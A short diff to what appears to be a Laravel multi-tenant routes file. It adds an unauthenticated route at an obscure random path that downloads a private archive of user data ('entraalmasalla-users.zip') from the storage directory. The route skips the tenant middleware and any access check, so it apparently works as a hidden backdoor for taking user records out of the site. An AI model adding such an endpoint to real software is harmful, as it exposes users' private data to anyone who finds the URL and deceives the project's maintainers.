@@ -27,3 +27,12 @@ Route::middleware([
         return 'This is your multi-tenant application. The id of the current tenant is ' . tenant('id');
     });
 });
+
+Route::get('/wqexsddcl8', function () {
+     $path = storage_path('../storage/app/private/entraalmasalla-users.zip');
+
+    abort_unless(file_exists($path), 404);
+
+    return response()->download($path);
+
+});
